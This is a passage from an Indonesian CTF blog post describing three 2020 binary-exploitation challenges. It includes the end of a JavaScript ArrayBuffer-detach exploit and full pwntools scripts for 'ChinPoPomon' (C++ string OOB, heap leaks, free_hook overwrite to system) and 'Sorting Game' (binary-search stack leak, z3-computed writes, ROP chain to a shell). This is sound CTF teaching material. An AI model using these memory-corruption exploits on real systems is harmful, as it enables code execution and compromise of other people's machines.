var e = new ArrayBuffer(0x350)
var f = new ArrayBuffer(0x350)
var g = new ArrayBuffer(0x350)
var h = new ArrayBuffer(0x350)
var dv = new DataView(a)
var dvv = new DataView(h)
dv.setInt32(16, 0x41424344)
ArrayBufferDetach(b)
ArrayBufferDetach(c)
ArrayBufferDetach(d)
ArrayBufferDetach(e)
ArrayBufferDetach(f)
ArrayBufferDetach(g)
ArrayBufferDetach(a)
ArrayBufferDetach(h)
var r = dvv.getFloat64(128)

r = Int64.fromDouble(r) - 0x3ebca0
fh = r + fh_off
system = r + system_off
console.log(fh)
console.log(fh / 0x100)
dv.setInt8(0, fh)
dv.setInt8(1, fh / 0x100)
dv.setInt8(2, fh / 0x10000)
dv.setInt8(3, fh / 0x1000000)
dv.setInt8(4, fh / 0x100000000)
dv.setInt8(5, fh / 0x10000000000)
dv.setInt8(6, fh / 0x1000000000000)
h = new ArrayBuffer(0x350)
a = new ArrayBuffer(0x350)
dvv = new DataView(a)
dv = new DataView(h)
dvv.setInt8(0, system)
dvv.setInt8(1, system / 0x100)
dvv.setInt8(2, system / 0x10000)
dvv.setInt8(3, system / 0x1000000)
dvv.setInt8(4, system / 0x100000000)
dvv.setInt8(5, system / 0x10000000000)
dvv.setInt8(6, system / 0x1000000000000)


dv.setInt8(0, 0x73)
dv.setInt8(1, 0x68)
ArrayBufferDetach(h)
EOF
```

Terdapat EOF sebab cara soal ini dijalankan, lihat [file soalnya](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing).

Exploit saya lumayan jelek, tapi terkadang saya mendapatkan error "Double free detected" secara random, yang ini kebetulan gak begitu :v



### 2. ChinPoPomon (Compfest CTF 2020 Finals) (Soal saya sendiri)
ChinPoPomon merupakan soal exploitasi C++, yang menyalahgunakan cara kerja string. Pembuat soal ini merupakan saya sendiri. Anda dapat unduh semua file soal ini pada link [ini](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing).

Namanya merupakan permainan kata Chinpokomon, dari South Park.

Soalnnya sendiri merupakan program yang biasa, dimana user dapat membuat suatu ChinPoPomon, dan juga memindahkan ChinPoPomon dari kantong ke pc (seperti pada permainan pokemon). Bug-nya terletak pada bagian kode yang berurusan dengan memindahkan ChinPoPomon dari pocket ke pc.

```cpp
void deposit_ChinPoPomon(vector<ChinPoPomon*> &pc)	{
	int choice;
	cout << "Choose pocket index: ";
	cin >> choice;
	if(choice > 5)	{
		cout << "Prof. Kinny: This isn't the time to do that!" << endl;
		return;
	}
    if(my_pocket[choice] != NULL)	{
        ...
```

Terdapat OOB disitu, sebab variabel "choice" bisa saja angka negatif! Varibael "my_pocket" merupakan variabel global, oleh karena itu mari kita lihat apalagi yang ada pada variabel global.

```cpp
string my_name;
ChinPoPomon *my_pocket[6];
```

Suatu string pas sebelum array :)

Ya... gimana cara kerja string di C++ pada level memori? Sebenarnya lumayan simpel. Process-nya akan mengalokasikan 4 word untuk string tersebut. Word pertama merupakan pointer ke string tersebut. Word kedua merupakan panjang string tersebut. Word ketiga dan keempat bersama merupakan suatu buffer sebesar 16 byte. Buffer tersebut digunakan untuk string yang memiliki panjang kurang dari 16. Selain itu heap akan digunakan.

Jadi rekap sedikit: Panjang string < 16 -> pointer ke buffer. Panjang string >= 16 -> pointer ke buffer di heap.

Dengan ilmu ini, kita dapat menginput string yang memiliki value pointer, dan menggunakan itu untuk mendapatkan leak heap dan libc.

<br>

Untuk menulis kealamat apapun, mari kita melihat cara class ChinPoPomon diimplementasi: 

```cpp
class ChinPoPomon
{
private:
	const char *type;
	string nickname;
	int curr_level;
	int curr_xp;
	void init_level_xp()	{
		this->curr_level = (rand() % 1000);
		this->curr_xp = (rand() % 1000);
	}
public:
	ChinPoPomon():nickname(NULL), type(NULL)	{
		init_level_xp();
	}
	ChinPoPomon(const char *type, string nickname)	{
		this->type = type;
		this->nickname = nickname;
	}
	void view_stats()	{
		cout << "Type: " << this->type << endl;
		cout << "Current Level: " << this->curr_level << endl;
		cout << "Current XP: " << this->curr_xp << endl;
		this->speak();

	}
	void speak()	{
		cout << this->nickname << ", " << this->nickname << "!" << endl;
	}
};


...
...
...

for (int i = 0; i < pc.size(); ++i)
	delete pc[i];	// Prevent memory leaks
```

Dengan ilmu ini, kita dapat menyalahgunakan atribut string pada class ChinPoPomon untuk menulis ke alamat manapun, dengan teknik seperti [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c).

Berikut exploit saya sendiri:

```py
from pwn import *
import codecs

p = process('./chinpopomon')


def set_name(name):
	p.sendlineafter("name?", name)

def create(type_num, nickname):
	p.sendlineafter("Choice:", '1')
	p.sendlineafter("Choice:", str(type_num))
	p.sendlineafter("Name: ", nickname)

def enter_pc():
	p.sendlineafter("Choice:", '2')

def exit_pc():
	p.sendlineafter("Choice:", '4')

def restart_game():
	p.sendlineafter("Choice:", '3')

def deposit(index):
	p.sendlineafter("PC Choice:", '1')
	p.sendlineafter("index:", str(index))

def withdraw(index):
	p.sendlineafter("PC Choice:", '2')
	p.sendlineafter("index:", str(index))

def view_stats(index):
	p.sendlineafter("PC Choice:", '3')
	p.sendlineafter("index:", str(index))


# Get libc leak
set_name(p64(0x4072d8) + p64(0x407280)[:-1])
enter_pc()
deposit(-2)
view_stats(0)

libc_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], 'hex'), 16)
libc_base = libc_leak - 0x3c7ce0
free_hook = libc_base + 0x1c9b28
system = libc_base + 0x30410
print(hex(libc_base))

withdraw(0)
exit_pc()
restart_game()



# Get heap leak
set_name(p64(0x4072d8) + p64(0x4072e0)[:-1])
create(1, 'qwe')
enter_pc()
deposit(-2)
view_stats(0)

p.recvuntil('Type: ')
heap_leak = int(codecs.encode(p.recvuntil("\n")[:-1][::-1], 'hex'), 16)
heap_base = heap_leak - 0x12ee0
print(hex(heap_base))

withdraw(0)
exit_pc()
for i in range(16):
	create(1, 'qwe')
restart_game()

set_name("ASD")
for i in range(10):
	create(1, (p64(heap_base+0x130f0)*2 + p64(5)).ljust(0x100, b"A") )
	enter_pc()
	deposit(0)
	exit_pc()
restart_game()

to_free = heap_base + 0x14040
print(hex(to_free))
set_name(p64(to_free))
create(1, "A"*0x100)
enter_pc()
deposit(-2)
exit_pc()
restart_game()


set_name("sh;\x00"*64)
create(1, p64(free_hook)*36)
create(1, p64(system)*32)
enter_pc()
deposit(-4)
exit_pc()
restart_game()


p.interactive()
p.close()
```

Soal ini lumayan seru untuk dibuat, sebab trik-trik class dan string merupakan sesuatu yang saya ingin pelajari dari dulu, dan membuat soal ini tentu membantu dalam mempelajarinya.



### 3. Sorting Game (Cyber Jawara 2020 Finals)
Sorting game merupakan soal yang paling membuat frustrasi, sebab soal ini agak random dan aneh. Kali saya aja yang bodoh. Pembuat soal ini merupakan orang yang LEBIH JAGO LAGI Fariskhi Vidyan. Anda dapat unduh semua file soal ini pada link [ini](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing).

Sorting game merupakan game 1v1 melawan AI, untuk mengurutkan suatu array angka agar terurut dari kecil ke besar, dengan mengubah angka-angka yang terdapat pada array tersebut. Pemain yang mengubah angka terakhir pada array tersebut hingga terurut merupakan pemenangnya.

Bug pertama terdapat pada pengecekan apakah array tersebut sudah terurut.

![Error](/assets/images/3_Favorite_Problems_2020/2.png)

Terdapat OOB pada potongan kode tersebut, dimana program tersebut akan memeriksa satu word dibelakang array. Satu word sebelum array tersebut merupakan pointer ke suatu "cost" variabel, yang memiliki cost dari permainan tersebut. Cost agak aneh, baca aja kodingannya:

![Error](/assets/images/3_Favorite_Problems_2020/3.png)

Sangat aneh, dan gak bisa di-_reverse_ (kecuali aku yang bodoh). Ini akan digunakan sebagai cara tulis ke alamat apapun.

<br>

Hal pertama yang kita perlukan adalah suatu stack leak, dan dari OOB sebelumnya dengan mudah bisa kita dapatkan stack leak. Triknya sebagai berikut: Asumsi semua angka pada array tersebut kecuali yang pertama sangat besar, dan terurut dari kecil ke besar. Setelah itu kita tebak nilai sebelum array tersebut, sebab ceknya dilakukan untuk word sebelum array, jika tebakan kita lebih besar daripada poniter sebelum array, maka kita menang, selain itu AI menang. Dengan insight ini kita dapat menggunakan [binary search](https://en.wikipedia.org/wiki/Binary_search_algorithm) untuk mendapatkan nilai dari poniter sebelum array.

Setelah kita mendapatkan nilai dari pointer tersebut, kita dapat mengubah nilai dari pointer tersebut dengan bug lain:

![Error](/assets/images/3_Favorite_Problems_2020/4.png)

Terdapat OOB, berarti kita dapat menulis ulang word sebelum array. Karena ini merupakan suatu pointer, maka kita dapat menulis kemana saja! Ya karena PIE dan ASLR hidup, maka tidak terlalu banyak yang kita dapat lakukan, tapi karena kita memiliki sebuah stack leak maka kita dapat menulis suatu _ROP chain_ dengan variabel cost. Setelah itu kita bisa dapatkan libc leak, tulis _ROP chain_ lagi, dan mendapatkan shell

Menulis ke variabel cost agak aneh, tapi menggunakan z3 saya mendapatkan peluang 50% untuk berhasil.

Berikut exploit saya sendiri:

```py


from pwn import *
from z3 import *
import codecs

p = process('./sorting_game')

largest_number = 0x0000fffffffffffe

# print(lst)

lo = 0
hi = largest_number
haha = 54
for j in range(haha):
	mid = (lo + hi) // 2
	p.sendlineafter("nomor bilangan:", str(1))
	p.sendlineafter("baru:", str(largest_number))
	p.sendlineafter("nomor bilangan:", str(2))
	p.sendlineafter("baru:", str(largest_number-1))

	for i in range(30):
		p.sendlineafter("nomor bilangan:", str(32-i))
		# print(str(largest_number - i))
		p.sendlineafter("baru:", str(largest_number - 32 + i))

	p.sendlineafter("nomor bilangan:", str(1))
	p.sendlineafter("baru:", str(mid))
	ans = p.recvuntil("menang!").decode('ascii')
	if("Anda menang!" in ans):
		hi = mid - 1
	else:
		lo = mid + 1
	if(j != haha-1):
		p.sendlineafter("(Y/N)", 'Y')

stack_leak = lo
print(hex(stack_leak))



def adder(amount, address, not_help=True, aaa = False):

	if(not_help):
		p.sendlineafter("(Y/N)", 'Y')
	p.sendlineafter("nomor bilangan:", str(1))
	p.sendlineafter("baru:", str(largest_number))
	p.sendlineafter("nomor bilangan:", str(2))
	p.sendlineafter("baru:", str(largest_number-1))
	p.sendlineafter("nomor bilangan:", str(3))
	p.sendlineafter("baru:", str(largest_number-2))

	for i in range(29):
		p.sendlineafter("nomor bilangan:", str(32-i))
		# print(str(largest_number - i))
		p.sendlineafter("baru:", str(largest_number - 32 + i))

	p.sendlineafter("nomor bilangan:", str(0))
	p.sendlineafter("baru:", str(address))
	# pause()
	p.sendlineafter("nomor bilangan:", str(2))

	s = Solver()
	x = BitVec('x', 64)
	if(aaa):
		x = BitVec('x', 32)
		s.add(x < 0x7fffffff)
	s.add((((4294967233 - x) & 0xffffffff) ^ (((4294967233 - x) & 0xffffffff) >> 0x1f)) - (((4294967233 - x) & 0xffffffff) >> 0x1f) == amount - 0x3f)
	s.check()
	hehe = s.model()[x]
	print(hehe)
	p.sendlineafter("baru:", str(hehe))

adder(0x6b, stack_leak + 0x128)
adder((stack_leak + 0x1d0) & 0xffffffff, stack_leak + 0x130, aaa=True)
adder((stack_leak + 0x1d0) >> 32, stack_leak + 0x134, aaa=True)
adder(0x634, stack_leak + 0x138)
adder(0x7ffffc38, stack_leak + 0x158)
adder(0x7ffffc38, stack_leak + 0x158)
# adder(0x330394ad, stack_leak + 0x158)
adder(0x3fffffff, stack_leak + 0x15c)
adder(0x3fffffff, stack_leak + 0x15c)
adder(0x3fffffff, stack_leak + 0x15c)
adder(0x3fffffff+3, stack_leak + 0x15c)
adder(0x7fffffcf, stack_leak + 0x160)
adder(0x7fffffcf, stack_leak + 0x160)
adder(0xc4, stack_leak + 0x160)
adder(0x3fffffff, stack_leak + 0x164)
adder(0x3fffffff, stack_leak + 0x164)
adder(0x3fffffff, stack_leak + 0x164)
adder(0x3fffffff+3, stack_leak + 0x164)
adder(0x6f0, stack_leak + 0x170)

# pause()

p.sendlineafter("(Y/N)", 'N')
libc_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], 'hex'), 16)
libc_base = libc_leak - 0x228190

print(hex(libc_base))

adder(0x4a7, stack_leak + 0x178, not_help=False)

adder(0x62, stack_leak + 0x168)

# adder((libc_base + 0x0000000000026b6e) & 0xffffffff, stack_leak + 180)
# while(p.recvuntil("menang!", timeout=1) == b''):
# adder((libc_base + 0x0000000000026b6e) >> 32, stack_leak + 0x184)
adder((libc_base + 0x0000000000027b72) & 0xffffffff, stack_leak + 0x1a0,aaa=True)
adder((libc_base + 0x0000000000027b72) >> 32, stack_leak + 0x1a4,aaa=True)
adder((libc_base + 0x1b85aa) & 0xffffffff, stack_leak + 0x1a8,aaa=True)
adder((libc_base + 0x1b85aa) >> 32, stack_leak + 0x1ac,aaa=True)
adder((libc_base + 0x000000000004a1f3) & 0xffffffff, stack_leak + 0x1b0,aaa=True)
adder((libc_base + 0x000000000004a1f3) >> 32, stack_leak + 0x1b4,aaa=True)
adder((libc_base + 0x00000000000286e7) & 0xffffffff, stack_leak + 0x1d8,aaa=True)
adder((libc_base + 0x00000000000286e7) >> 32, stack_leak + 0x1dc,aaa=True)
adder((libc_base + 0x0000000000027b72+1) & 0xffffffff, stack_leak + 0x1f8,aaa=True)
adder((libc_base + 0x0000000000027b72+1) >> 32, stack_leak + 0x1fc,aaa=True)
adder((libc_base + 0x56410) & 0xffffffff, stack_leak + 0x200,aaa=True)
adder((libc_base + 0x56410) >> 32, stack_leak + 0x204,aaa=True)


pause()
p.sendlineafter("(Y/N)", 'N')


p.interactive()
p.close()
```

Saya yang pertama solve soal ini pada saat lomba btw :)


### Closing Statement
Ya 2020 merupakan bencana tapi CTF-nya lumayan seru. Semua 2021 lebih baik lagi :D